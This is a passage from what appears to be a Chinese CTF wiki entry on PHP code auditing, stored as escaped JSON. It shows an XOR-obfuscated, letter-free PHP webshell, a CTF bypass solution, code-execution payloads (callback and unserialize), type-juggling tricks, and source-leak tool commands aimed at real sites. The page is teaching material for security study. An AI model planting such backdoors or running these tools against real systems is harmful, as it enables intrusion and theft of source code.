\uff0c\u6240\u4ee5\u6267\u884c\u7ed3\u679c\u4e3a Hello Angel_Kitty \u3002\u5728 PHP \u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5b57\u7b26\u4e32\u5f53\u4f5c\u51fd\u6570\u6765\u5904\u7406\u3002 \u770b\u5230\u8fd9\u91cc\uff0c\u76f8\u4fe1\u5927\u5bb6\u5982\u679c\u518d\u770b\u5230\u7c7b\u4f3c\u7684 PHP \u540e\u95e8\u5e94\u8be5\u4e0d\u4f1a\u90a3\u4e48\u8ff7\u60d1\u4e86\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u4e00\u53e5\u53e5\u7684\u5206\u6790\u540e\u95e8\u4ee3\u7801\u6765\u7406\u89e3\u540e\u95e8\u60f3\u5b9e\u73b0\u7684\u529f\u80fd\u3002 \u6211\u4eec\u5e0c\u671b\u4f7f\u7528\u8fd9\u79cd\u540e\u95e8\u521b\u5efa\u4e00\u4e9b\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u6d4b\u7684\u5e76\u4e14\u5bf9\u6211\u4eec\u6709\u7528\u7684\u5b57\u7b26\u4e32\uff0c\u5982 _POST \uff0c system \uff0c call_user_func_array \uff0c\u6216\u8005\u662f\u4efb\u4f55\u6211\u4eec\u9700\u8981\u7684\u4e1c\u897f\u3002 \u4e0b\u9762\u662f\u4e2a\u975e\u5e38\u7b80\u5355\u7684\u975e\u6570\u5b57\u5b57\u6bcd\u7684 PHP \u540e\u95e8\uff1a <?php @$_++; // $_ = 1 $__=(\"#\"^\"|\"); // $__ = _ $__.=(\".\"^\"~\"); // _P $__.=(\"/\"^\"`\"); // _PO $__.=(\"|\"^\"/\"); // _POS $__.=(\"{\"^\"/\"); // _POST ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]); ?> \u5728\u8fd9\u91cc\u6211\u8bf4\u660e\u4e0b\uff0c .= \u662f\u5b57\u7b26\u4e32\u7684\u8fde\u63a5\uff0c\u5177\u4f53\u53c2\u770b PHP \u8bed\u6cd5 \u6211\u4eec\u751a\u81f3\u53ef\u4ee5\u5c06\u4e0a\u9762\u7684\u4ee3\u7801\u5408\u5e76\u4e3a\u4e00\u884c\uff0c\u4ece\u800c\u4f7f\u7a0b\u5e8f\u7684\u53ef\u8bfb\u6027\u66f4\u5dee\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a $__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"{\"^\"/\"); \u6211\u4eec\u56de\u5230 xman \u8bad\u7ec3\u8d5b\u7684\u90a3\u9898\u6765\u770b\uff0c\u6211\u4eec\u7684\u60f3\u6cd5\u662f\u901a\u8fc7\u6784\u9020\u5f02\u6216\u6765\u53bb\u7ed5\u8fc7\u90a3\u4e32\u5b57\u7b26\uff0c\u90a3\u4e48\u6211\u4eec\u8be5\u5982\u4f55\u6784\u9020\u8fd9\u4e2a\u5b57\u4e32\u4f7f\u5f97\u957f\u5ea6\u5c0f\u4e8e 40 \u5462\uff1f \u6211\u4eec\u6700\u7ec8\u662f\u8981\u8bfb\u53d6\u5230\u90a3\u4e2a getFlag \u51fd\u6570\uff0c\u6211\u4eec\u9700\u8981\u6784\u9020\u4e00\u4e2a _GET \u6765\u53bb\u8bfb\u53d6\u8fd9\u4e2a\u51fd\u6570\uff0c\u6211\u4eec\u6700\u7ec8\u6784\u9020\u4e86\u5982\u4e0b\u5b57\u7b26\u4e32\uff1a \u53ef\u80fd\u5f88\u591a\u5c0f\u4f19\u4f34\u770b\u5230\u8fd9\u91cc\u4ecd\u7136\u65e0\u6cd5\u7406\u89e3\u8fd9\u6bb5\u5b57\u7b26\u4e32\u662f\u5982\u4f55\u6784\u9020\u7684\u5427\uff0c\u6211\u4eec\u5c31\u5bf9\u8fd9\u6bb5\u5b57\u7b26\u4e32\u8fdb\u884c\u6bb5\u5206\u6790\u3002 \u6784\u9020 _GET \u8bfb\u53d6 \u00b6 \u9996\u5148\u6211\u4eec\u5f97\u77e5\u9053 _GET \u7531\u4ec0\u4e48\u5f02\u6216\u800c\u6765\u7684\uff0c\u7ecf\u8fc7\u6211\u7684\u5c1d\u8bd5\u4e0e\u5206\u6790\uff0c\u6211\u5f97\u51fa\u4e86\u4e0b\u9762\u7684\u7ed3\u8bba\uff1a <?php echo \"`{{{\"^\"?<>/\";//_GET ?> \u8fd9\u6bb5\u4ee3\u7801\u4e00\u5927\u5768\u662f\u5565\u610f\u601d\u5462\uff1f\u56e0\u4e3a40\u4e2a\u5b57\u7b26\u957f\u5ea6\u7684\u9650\u5236\uff0c\u5bfc\u81f4\u4ee5\u524d\u9010\u4e2a\u5b57\u7b26\u5f02\u6216\u62fc\u63a5\u7684webshell\u4e0d\u80fd\u4f7f\u7528\u3002 \u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528php\u4e2d\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u7684\u53cd\u5f15\u53f7 ` \u548c Linux \u4e0b\u9762\u7684\u901a\u914d\u7b26 ? ? \u4ee3\u8868\u5339\u914d\u4e00\u4e2a\u5b57\u7b26 ` \u8868\u793a\u6267\u884c\u547d\u4ee4 \" \u5bf9\u7279\u6b8a\u5b57\u7b26\u4e32\u8fdb\u884c\u89e3\u6790 \u7531\u4e8e ? \u53ea\u80fd\u5339\u914d\u4e00\u4e2a\u5b57\u7b26\uff0c\u8fd9\u79cd\u5199\u6cd5\u7684\u610f\u601d\u662f\u5faa\u73af\u8c03\u7528\uff0c\u5206\u522b\u5339\u914d\u3002\u6211\u4eec\u5c06\u5176\u8fdb\u884c\u5206\u89e3\u6765\u770b\uff1a <?php echo \"{\"^\"<\"; ?> \u8f93\u51fa\u7ed3\u679c\u4e3a\uff1a <?php echo \"{\"^\">\"; ?> \u8f93\u51fa\u7ed3\u679c\u4e3a\uff1a <?php echo \"{\"^\"/\"; ?> \u8f93\u51fa\u7ed3\u679c\u4e3a\uff1a \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\uff0c _GET \u5c31\u662f\u8fd9\u4e48\u88ab\u6784\u9020\u51fa\u6765\u7684\u5566\uff01 \u83b7\u53d6 _GET \u53c2\u6570 \u00b6 \u6211\u4eec\u53c8\u8be5\u5982\u4f55\u83b7\u53d6 _GET \u53c2\u6570\u5462\uff1f\u54b1\u4eec\u53ef\u4ee5\u6784\u9020\u51fa\u5982\u4e0b\u5b57\u4e32\uff1a <?php echo ${$_}[_](${$_}[__]);//$_GET[_]($_GET[__]) ?> \u6839\u636e\u524d\u9762\u6784\u9020\u7684\u6765\u770b\uff0c $_ \u5df2\u7ecf\u53d8\u6210\u4e86 _GET \u3002\u987a\u7406\u6210\u7ae0\u7684\u6765\u8bb2\uff0c $_ = _GET \u3002\u6211\u4eec\u6784\u5efa $_GET[__] \u662f\u4e3a\u4e86\u8981\u83b7\u53d6\u53c2\u6570\u503c\u3002 \u4f20\u5165\u53c2\u6570 \u00b6 \u6b64\u65f6\u6211\u4eec\u53ea\u9700\u8981\u53bb\u8c03\u7528 getFlag \u51fd\u6570\u83b7\u53d6 webshell \u5c31\u597d\u4e86\uff0c\u6784\u9020\u5982\u4e0b\uff1a <?php echo $_=getFlag;//getFlag ?> \u6240\u4ee5\u628a\u53c2\u6570\u5168\u90e8\u8fde\u63a5\u8d77\u6765\uff0c\u5c31\u53ef\u4ee5\u4e86\u3002 \u7ed3\u679c\u5982\u4e0b\uff1a \u4e8e\u662f\u6211\u4eec\u5c31\u6210\u529f\u5730\u8bfb\u53d6\u5230\u4e86flag\uff01 \u52a8\u6001\u51fd\u6570\u6267\u884c \u00b6 \u7528\u6237\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\u53ef\u4ee5\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002 <?php $dyn_func = $_GET [ \"dyn_func\" ]; $argument = $_GET [ \"argument\" ]; $dyn_func ( $argument ); ?> \u53cd\u5f15\u53f7\u547d\u4ee4\u6267\u884c \u00b6 <?php echo `ls -al` ; ?> Curly Syntax \u00b6 PHP \u7684 Curly Syntax \u4e5f\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\uff0c\u5b83\u5c06\u6267\u884c\u82b1\u62ec\u53f7\u95f4\u7684\u4ee3\u7801\uff0c\u5e76\u5c06\u7ed3\u679c\u66ff\u6362\u56de\u53bb\u3002 <?php $var = \"aaabbbccc ${ `ls` } \" ; ?> <?php $foobar = \"phpinfo\" ; $ { \"foobar\" }(); ?> \u56de\u8c03\u51fd\u6570 \u00b6 \u5f88\u591a\u51fd\u6570\u90fd\u53ef\u4ee5\u6267\u884c\u56de\u8c03\u51fd\u6570\uff0c\u5f53\u56de\u8c03\u51fd\u6570\u7528\u6237\u53ef\u63a7\u65f6\uff0c\u5c06\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002 <?php $evil_callback = $_GET [ \"callback\" ]; $some_array = array ( 0 , 1 , 2 , 3 ); $new_array = array_map ( $evil_callback , $some_array ); ?> \u653b\u51fb payload http://www.a.com/index.php?callback=phpinfo \u53cd\u5e8f\u5217\u5316 \u00b6 \u5982\u679c unserialize() \u5728\u6267\u884c\u65f6\u5b9a\u4e49\u4e86 __destruct() \u6216 __wakeup() \u51fd\u6570\uff0c\u5219\u6709\u53ef\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002 <?php class Example { var $var = \"\" ; function __destruct () { eval ( $this -> var ); } } unserialize ( $_GET [ \"saved_code\" ]); ?> \u653b\u51fb payload http://www.a.com/index.php?saved_code=O:7:\"Example\":1:{s:3:\"var\";s:10:\"phpinfo();\";} PHP \u7279\u6027 \u00b6 \u6570\u7ec4 \u00b6 <?php $var = 1 ; $var = array (); $var = \"string\" ; ?> php \u4e0d\u4f1a\u4e25\u683c\u68c0\u9a8c\u4f20\u5165\u7684\u53d8\u91cf\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u5c06\u53d8\u91cf\u81ea\u7531\u7684\u8f6c\u6362\u7c7b\u578b\u3002 \u6bd4\u5982\u5728 $a == $b \u7684\u6bd4\u8f83\u4e2d $a = null; $b = false; //\u4e3a\u771f $a = ''; $b = 0; //\u540c\u6837\u4e3a\u771f \u7136\u800c\uff0cPHP \u5185\u6838\u7684\u5f00\u53d1\u8005\u539f\u672c\u662f\u60f3\u8ba9\u7a0b\u5e8f\u5458\u501f\u7531\u8fd9\u79cd\u4e0d\u9700\u8981\u58f0\u660e\u7684\u4f53\u7cfb\uff0c\u66f4\u52a0\u9ad8\u6548\u7684\u5f00\u53d1\uff0c\u6240\u4ee5\u5728\u51e0\u4e4e\u6240\u6709\u5185\u7f6e\u51fd\u6570\u4ee5\u53ca\u57fa\u672c\u7ed3\u6784\u4e2d\u4f7f\u7528\u4e86\u5f88\u591a\u677e\u6563\u7684\u6bd4\u8f83\u548c\u8f6c\u6362\uff0c\u9632\u6b62\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cf\u56e0\u4e3a\u7a0b\u5e8f\u5458\u7684\u4e0d\u89c4\u8303\u800c\u9891\u7e41\u7684\u62a5\u9519\uff0c\u7136\u800c\u8fd9\u5374\u5e26\u6765\u4e86\u5b89\u5168\u95ee\u9898\u3002 0=='0' //true 0 == 'abcdefg' //true 0 === 'abcdefg' //false 1 == '1abcdef' //true \u9b54\u6cd5 Hash \u00b6 \"0e132456789\"==\"0e7124511451155\" //true \"0e123456abc\"==\"0e1dddada\" //false \"0e1abc\"==\"0\" //true \u5728\u8fdb\u884c\u6bd4\u8f83\u8fd0\u7b97\u65f6\uff0c\u5982\u679c\u9047\u5230\u4e86 0e\\d+ \u8fd9\u79cd\u5b57\u7b26\u4e32\uff0c\u5c31\u4f1a\u5c06\u8fd9\u79cd\u5b57\u7b26\u4e32\u89e3\u6790\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\u3002\u6240\u4ee5\u4e0a\u9762\u4f8b\u5b50\u4e2d 2 \u4e2a\u6570\u7684\u503c\u90fd\u662f 0 \u56e0\u800c\u5c31\u76f8\u7b49\u4e86\u3002\u5982\u679c\u4e0d\u6ee1\u8db3 0e\\d+ \u8fd9\u79cd\u6a21\u5f0f\u5c31\u4e0d\u4f1a\u76f8\u7b49\u3002 \u5341\u516d\u8fdb\u5236\u8f6c\u6362 \u00b6 \"0x1e240\"==\"123456\" //true \"0x1e240\"==123456 //true \"0x1e240\"==\"1e240\" //false \u5f53\u5176\u4e2d\u7684\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f 0x \u5f00\u5934\u7684\u65f6\u5019\uff0cPHP \u4f1a\u5c06\u6b64\u5b57\u7b26\u4e32\u89e3\u6790\u6210\u4e3a\u5341\u8fdb\u5236\u7136\u540e\u518d\u8fdb\u884c\u6bd4\u8f83\uff0c 0x1240 \u89e3\u6790\u6210\u4e3a\u5341\u8fdb\u5236\u5c31\u662f 123456\uff0c\u6240\u4ee5\u4e0e int \u7c7b\u578b\u548c string \u7c7b\u578b\u7684 123456 \u6bd4\u8f83\u90fd\u662f\u76f8\u7b49\u3002 \u7c7b\u578b\u8f6c\u6362 \u00b6 \u5e38\u89c1\u7684\u8f6c\u6362\u4e3b\u8981\u5c31\u662f int \u8f6c\u6362\u4e3a string \uff0c string \u8f6c\u6362\u4e3a int \u3002 int \u8f6c string $var = 5; \u65b9\u5f0f1\uff1a$item = (string)$var; \u65b9\u5f0f2\uff1a$item = strval($var); string \u8f6c int \uff1a intval() \u51fd\u6570\u3002 \u5bf9\u4e8e\u8fd9\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u5148\u770b 2 \u4e2a\u4f8b\u5b50\u3002 var_dump(intval('2')) //2 var_dump(intval('3abcd')) //3 var_dump(intval('abcd')) //0 \u8bf4\u660e intval() \u8f6c\u6362\u7684\u65f6\u5019\uff0c\u4f1a\u4ece\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\u76f4\u5230\u9047\u5230\u4e00\u4e2a\u975e\u6570\u5b57\u7684\u5b57\u7b26\u3002\u5373\u4f7f\u51fa\u73b0\u65e0\u6cd5\u8f6c\u6362\u7684\u5b57\u7b26\u4e32\uff0c intval() \u4e0d\u4f1a\u62a5\u9519\u800c\u662f\u8fd4\u56de 0\u3002 \u540c\u65f6\uff0c\u7a0b\u5e8f\u5458\u5728\u7f16\u7a0b\u7684\u65f6\u5019\u4e5f\u4e0d\u5e94\u8be5\u4f7f\u7528\u5982\u4e0b\u7684\u8fd9\u6bb5\u4ee3\u7801\uff1a if(intval($a)>1000) { mysql_query(\"select * from news where id=\".$a) } \u8fd9\u4e2a\u65f6\u5019 $a \u7684\u503c\u6709\u53ef\u80fd\u662f 1002 union \u3002 \u5185\u7f6e\u51fd\u6570\u7684\u53c2\u6570\u7684\u677e\u6563\u6027 \u00b6 \u5185\u7f6e\u51fd\u6570\u7684\u677e\u6563\u6027\u8bf4\u7684\u662f\uff0c\u8c03\u7528\u51fd\u6570\u65f6\u7ed9\u51fd\u6570\u4f20\u9012\u51fd\u6570\u65e0\u6cd5\u63a5\u53d7\u7684\u53c2\u6570\u7c7b\u578b\u3002\u89e3\u91ca\u8d77\u6765\u6709\u70b9\u62d7\u53e3\uff0c\u8fd8\u662f\u76f4\u63a5\u901a\u8fc7\u5b9e\u9645\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u95ee\u9898\uff0c\u4e0b\u9762\u4f1a\u91cd\u70b9\u4ecb\u7ecd\u51e0\u4e2a\u8fd9\u79cd\u51fd\u6570\u3002 md5() $array1[] = array( \"foo\" => \"bar\", \"bar\" => \"foo\", ); $array2 = array(\"foo\", \"bar\", \"hello\", \"world\"); var_dump(md5($array1)==md5($array2)); //true PHP \u624b\u518c\u4e2d\u7684 md5\uff08\uff09\u51fd\u6570\u7684\u63cf\u8ff0\u662f string md5 ( string $str [, bool $raw_output = false ] ) \uff0c md5() \u4e2d\u7684\u9700\u8981\u662f\u4e00\u4e2a string \u7c7b\u578b\u7684\u53c2\u6570\u3002\u4f46\u662f\u5f53\u4f60\u4f20\u9012\u4e00\u4e2a array \u65f6\uff0c md5() \u4e0d\u4f1a\u62a5\u9519\uff0c\u53ea\u662f\u4f1a\u65e0\u6cd5\u6b63\u786e\u5730\u6c42\u51fa array \u7684 md5 \u503c\uff0c\u8fd9\u6837\u5c31\u4f1a\u5bfc\u81f4\u4efb\u610f 2 \u4e2a array \u7684 md5 \u503c\u90fd\u4f1a\u76f8\u7b49\u3002 strcmp() strcmp() \u51fd\u6570\u5728 PHP \u5b98\u65b9\u624b\u518c\u4e2d\u7684\u63cf\u8ff0\u662f intstrcmp ( string $str1 \uff0c string $str2 ) \uff0c\u9700\u8981\u7ed9 strcmp() \u4f20\u9012 2 \u4e2a string \u7c7b\u578b\u7684\u53c2\u6570\u3002\u5982\u679c str1 \u5c0f\u4e8e str2 \uff0c\u8fd4\u56de -1\uff0c\u76f8\u7b49\u8fd4\u56de 0\uff0c\u5426\u5219\u8fd4\u56de 1\u3002 strcmp() \u51fd\u6570\u6bd4\u8f83\u5b57\u7b26\u4e32\u7684\u672c\u8d28\u662f\u5c06\u4e24\u4e2a\u53d8\u91cf\u8f6c\u6362\u4e3a ASCII\uff0c\u7136\u540e\u8fdb\u884c\u51cf\u6cd5\u8fd0\u7b97\uff0c\u7136\u540e\u6839\u636e\u8fd0\u7b97\u7ed3\u679c\u6765\u51b3\u5b9a\u8fd4\u56de\u503c\u3002 \u5982\u679c\u4f20\u5165\u7ed9\u51fa strcmp() \u7684\u53c2\u6570\u662f\u6570\u5b57\u5462\uff1f $array=[1,2,3]; var_dump(strcmp($array,'123')); //null,\u5728\u67d0\u79cd\u610f\u4e49\u4e0anull\u4e5f\u5c31\u662f\u76f8\u5f53\u4e8efalse\u3002 switch() \u5982\u679c switch() \u662f\u6570\u5b57\u7c7b\u578b\u7684 case \u7684\u5224\u65ad\u65f6\uff0cswitch \u4f1a\u5c06\u5176\u4e2d\u7684\u53c2\u6570\u8f6c\u6362\u4e3a int \u7c7b\u578b\u3002\u5982\u4e0b\uff1a $i =\"2abc\"; switch ($i) { case 0: case 1: case 2: echo \"i is less than 3 but not negative\"; break; case 3: echo \"i is 3\"; } \u8fd9\u4e2a\u65f6\u5019\u7a0b\u5e8f\u8f93\u51fa\u7684\u662f i is less than 3 but not negative \uff0c\u662f\u7531\u4e8e switch() \u51fd\u6570\u5c06 $i \u8fdb\u884c\u4e86\u7c7b\u578b\u8f6c\u6362\uff0c\u8f6c\u6362\u7ed3\u679c\u4e3a 2\u3002 in_array() \u5728 PHP \u624b\u518c\u4e2d\uff0c in_array() \u51fd\u6570\u7684\u89e3\u91ca\u662f bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) ,\u5982\u679cstrict\u53c2\u6570\u6ca1\u6709\u63d0\u4f9b\uff0c\u90a3\u4e48 in_array \u5c31\u4f1a\u4f7f\u7528\u677e\u6563\u6bd4\u8f83\u6765\u5224\u65ad $needle \u662f\u5426\u5728 $haystack \u4e2d\u3002\u5f53 strict \u7684\u503c\u4e3a true \u65f6\uff0c in_array() \u4f1a\u6bd4\u8f83 needls \u7684\u7c7b\u578b\u548c haystack \u4e2d\u7684\u7c7b\u578b\u662f\u5426\u76f8\u540c\u3002 $array=[0,1,2,'3']; var_dump(in_array('abc', $array)); //true var_dump(in_array('1bc', $array)); //true \u53ef\u4ee5\u770b\u5230\u4e0a\u9762\u7684\u60c5\u51b5\u8fd4\u56de\u7684\u90fd\u662f true\uff0c\u56e0\u4e3a 'abc' \u4f1a\u8f6c\u6362\u4e3a 0\uff0c '1bc' \u8f6c\u6362\u4e3a 1\u3002 array_search() \u4e0e in_array() \u4e5f\u662f\u4e00\u6837\u7684\u95ee\u9898\u3002 \u5bfb\u627e\u6e90\u4ee3\u7801\u5907\u4efd \u00b6 hg \u6e90\u7801\u6cc4\u9732 \u00b6 hg init \u65f6\u4f1a\u4ea7\u751f .hg \u6587\u4ef6\u3002 \u5229\u7528\u5de5\u5177 dvcs-ripper Git \u6e90\u7801\u6cc4\u9732 \u00b6 .git \u76ee\u5f55\u5185\u6709\u4ee3\u7801\u7684\u53d8\u66f4\u8bb0\u5f55\u7b49\u6587\u4ef6\uff0c\u5982\u679c\u90e8\u7f72\u65f6\u8be5\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u53ef\u88ab\u8bbf\u95ee\uff0c\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u6765\u6062\u590d\u6e90\u4ee3\u7801\u3002 /.git /.git/HEAD /.git/index /.git/config /.git/description GitHack python GitHack.py http://www.openssl.org/.git/ GitHacker\uff08\u53ef\u6062\u590d\u5b8c\u6574 Git \u4ed3\u5e93\uff09 python GitHacker.py http://www.openssl.org/.git/ .DS_Store \u6587\u4ef6\u6cc4\u9732 \u00b6 Mac OS \u4e2d\u4f1a\u5305\u542b\u6709 .DS_Store \u6587\u4ef6\uff0c\u5305\u542b\u6587\u4ef6\u540d\u7b49\u4fe1\u606f\u3002 \u5229\u7528\u5de5\u5177 ds_store_exp python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store hd.zj.qq.com/ \u2514\u2500\u2500 themes \u2514\u2500\u2500 galaxyw \u251c\u2500\u2500 app \u2502 \u2514\u2500\u2500 css \u2502 \u2514\u2500\u2500 style.min.css \u251c\u2500\u2500 cityData.min.js \u251c\u2500\u2500 images \u2502 \u2514\u2500\u2500 img \u2502 \u251c\u2500\u2500 bg-hd.png \u2502 \u251c\u2500\u2500 bg-item-activity.png \u2502 \u251c\u2500\u2500 bg-masker-pop.png \u2502 \u251c\u2500\u2500 btn-bm.png \u2502 \u251c\u2500\u2500 btn-login-qq.png \u2502 \u251c\u2500\u2500 btn-login-wx.png \u2502 \u251c\u2500\u2500 ico-add-pic.png \u2502 \u251c\u2500\u2500 ico-address.png \u2502 \u251c\u2500\u2500 ico-bm.png \u2502 \u251c\u2500\u2500 ico-duration-time.png \u2502 \u251c\u2500\u2500 ico-pop-close.png \u2502 \u251c\u2500\u2500 ico-right-top-delete.png \u2502 \u251c\u2500\u2500 page-login-hd.png \u2502 \u251c\u2500\u2500 pic-masker.png \u2502 \u2514\u2500\u2500 ticket-selected.png \u2514\u2500\u2500 member \u251c\u2500\u2500 assets \u2502 \u251c\u2500\u2500 css \u2502 \u2502 \u251c\u2500\u2500 ace-reset.css \u2502 \u2502 \u2514\u2500\u2500 antd.css \u2502 \u2514\u2500\u2500 lib \u2502 \u251c\u2500\u2500 cityData.min.js \u2502 \u2514\u2500\u2500 ueditor \u2502 \u251c\u2500\u2500 index.html \u2502 \u251c\u2500\u2500 lang \u2502 \u2502 \u2514\u2500\u2500 zh-cn \u2502 \u2502 \u251c\u2500\u2500 images \u2502 \u2502 \u2502 \u251c\u2500\u2500 copy.png \u2502 \u2502 \u2502 \u251c\u2500\u2500 localimage.png \u2502 \u2502 \u2502 \u251c\u2500\u2500 music.png \u2502 \u2502 \u2502 \u2514\u2500\u2500 upload.png \u2502 \u2502 \u2514\u2500\u2500 zh-cn.js \u2502 \u251c\u2500\u2500 php \u2502 \u2502 \u251c\u2500\u2500 action_crawler.php \u2502 \u2502 \u251c\u2500\u2500 action_list.php \u2502 \u2502 \u251c\u2500\u2500 action_upload.php \u2502 \u2502 \u251c\u2500\u2500 config.json \u2502 \u2502 \u251c\u2500\u2500 controller.php \u2502 \u2502 \u2514\u2500\u2500 Uploader.class.php \u2502 \u251c\u2500\u2500 ueditor.all.js \u2502 \u251c\u2500\u2500 ueditor.all.min.js \u2502 \u251c\u2500\u2500 ueditor.config.js \u2502 \u251c\u2500\u2500 ueditor.parse.js \u2502 \u2514\u2500\u2500 ueditor.parse.min.js \u2514\u2500\u2500 static \u251c\u2500\u2500 css \u2502 \u2514\u2500\u2500 page.css \u251c\u2500\u2500 img \u2502 \u251c\u2500\u2500 bg-table-title.png \u2502 \u251c\u2500\u2500 bg-tab-say.png \u2502 \u251c\u2500\u2500 ico-black-disabled.png \u2502 \u251c\u2500\u2500 ico-black-enabled.png \u2502 \u251c\u2500\u2500 ico-coorption-person.png \u2502 \u251c\u2500\u2500 ico-miss-person.png \u2502 \u251c\u2500\u2500 ico-mr-person.png \u2502 \u251c\u2500\u2500 ico-white-disabled.png \u2502 \u2514\u2500\u2500 ico-white-enabled.png \u2514\u2500\u2500 scripts \u251c\u2500\u2500 js \u2514\u2500\u2500 lib \u2514\u2500\u2500 jquery.min.js 21 directories, 48 files \u7f51\u7ad9\u5907\u4efd\u6587\u4ef6 \u00b6 \u7ba1\u7406\u5458\u5907\u4efd\u7f51\u7ad9\u6587\u4ef6\u540e\u9519\u8bef\u5730\u5c06\u5907\u4efd\u653e\u5728 Web \u76ee\u5f55\u4e0b\u3002 \u5e38\u89c1\u7684\u540e\u7f00\u540d\uff1a .rar .zip .7z .tar .tar.gz .bak .txt SVN \u6cc4\u9732 \u00b6 \u654f\u611f\u6587\u4ef6\uff1a /.svn /.svn/wc.db /.svn/entries dvcs-ripper perl rip-svn.pl -v -u http://www.example.com/.svn/ Seay - SVN WEB-INF / web.xml \u6cc4\u9732 \u00b6 WEB-INF \u662f Java Web \u5e94\u7528\u7684\u5b89\u5168\u76ee\u5f55\uff0cweb.xml \u4e2d\u6709\u6587\u4ef6\u7684\u6620\u5c04\u5173\u7cfb\u3002 WEB-INF \u4e3b\u8981\u5305\u542b\u4e00\u4e0b\u6587\u4ef6\u6216\u76ee\u5f55\uff1a /WEB-INF/web.xml \uff1aWeb \u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u6587\u4ef6\uff0c\u63cf\u8ff0\u4e86 servlet \u548c\u5176\u4ed6\u7684\u5e94\u7528\u7ec4\u4ef6\u914d\u7f6e\u53ca\u547d\u540d\u89c4\u5219\u3002 /WEB-INF/classes/ \uff1a\u542b\u4e86\u7ad9\u70b9\u6240\u6709\u7528\u7684 class \u6587\u4ef6\uff0c\u5305\u62ec servlet class \u548c\u975e servlet class\uff0c\u4ed6\u4eec\u4e0d\u80fd\u5305\u542b\u5728 jar \u6587\u4ef6\u4e2d\u3002 /WEB-INF/lib/ \uff1a\u5b58\u653e web \u5e94\u7528\u9700\u8981\u7684\u5404\u79cd JAR \u6587\u4ef6\uff0c\u653e\u7f6e\u4ec5\u5728\u8fd9\u4e2a\u5e94\u7528\u4e2d\u8981\u6c42\u4f7f\u7528\u7684 jar \u6587\u4ef6\uff0c\u5982\u6570\u636e\u5e93\u9a71\u52a8 jar \u6587\u4ef6\u3002 /WEB-INF/src/ \uff1a\u6e90\u7801\u76ee\u5f55\uff0c\u6309\u7167\u5305\u540d\u7ed3\u6784\u653e\u7f6e\u5404\u4e2a java \u6587\u4ef6\u3002 /WEB-INF/database.properties \uff1a\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u3002 \u901a\u8fc7\u627e\u5230 web.xml \u6587\u4ef6\uff0c\u63a8\u65ad class \u6587\u4ef6\u7684\u8def\u5f84\uff0c\u6700\u540e\u76f4\u63a5 class \u6587\u4ef6\uff0c\u518d\u901a\u8fc7\u53cd\u7f16\u8bd1 class \u6587\u4ef6\uff0c\u5f97\u5230\u7f51\u7ad9\u6e90\u7801\u3002 \u4e00\u822c\u60c5\u51b5\uff0cjsp \u5f15\u64ce\u9ed8\u8ba4\u90fd\u662f\u7981\u6b62\u8bbf\u95ee WEB-INF \u76ee\u5f55\u7684\uff0cNginx \u914d\u5408 Tomcat \u505a\u5747\u8861\u8d1f\u8f7d\u6216\u96c6\u7fa4\u7b49\u60c5\u51b5\u65f6\uff0c\u95ee\u9898\u539f\u56e0\u5176\u5b9e\u5f88\u7b80\u5355\uff0cNginx \u4e0d\u4f1a\u53bb\u8003\u8651\u914d\u7f6e\u5176\u4ed6\u7c7b\u578b\u5f15\u64ce\uff08Nginx \u4e0d\u662f jsp \u5f15\u64ce\uff09\u5bfc\u81f4\u7684\u5b89\u5168\u95ee\u9898\u800c\u5f15\u5165\u5230\u81ea\u8eab\u7684\u5b89\u5168\u89c4\u8303\u4e2d\u6765\uff08\u8fd9\u6837\u8026\u5408\u6027\u592a\u9ad8\u4e86\uff09\uff0c\u4fee\u6539 Nginx \u914d\u7f6e\u6587\u4ef6\u7981\u6b62\u8bbf\u95ee WEB-INF \u76ee\u5f55\u5c31\u597d\u4e86\uff1a location ~ ^/WEB-INF/* { deny all ; } # \u6216\u8005return 404; \u6216\u8005\u5176\u4ed6\uff01 CVS \u6cc4\u9732 \u00b6 http://url/CVS/Root \u8fd4\u56de\u6839\u4fe1\u606f http://url/CVS/Entries \u8fd4\u56de\u6240\u6709\u6587\u4ef6\u7684\u7ed3\u6784 \u53d6\u56de\u6e90\u7801 bk clone http://url/name dir \u53c2\u8003\u6587\u732e \u00b6 \u8bb0\u4e00\u6b21\u62ffwebshell\u8e29\u8fc7\u7684\u5751(\u5982\u4f55\u7528PHP\u7f16\u5199\u4e00\u4e2a\u4e0d\u5305\u542b\u6570\u5b57\u548c\u5b57\u6bcd\u7684\u540e\u95e8)","title":"PHP \u4ee3\u7801\u5ba1\u8ba1"},{"location":"web/php/php/#php","text":"","title":"PHP \u4ee3\u7801\u5ba1\u8ba1"},{"location":"web/php/php/#_1","text":"\u5e38\u89c1\u7684\u5bfc\u81f4\u6587\u4ef6\u5305\u542b\u7684\u51fd\u6570\u6709\uff1a PHP\uff1a include() \uff0c include_once() \uff0c require() \uff0c require_once() \uff0c fopen() \uff0c readfile() \u7b49 JSP Servlet\uff1a ava.io.File() \uff0c java.io.FileReader() \u7b49 ASP\uff1a includefile \uff0c includevirtual \u7b49 \u5f53 PHP 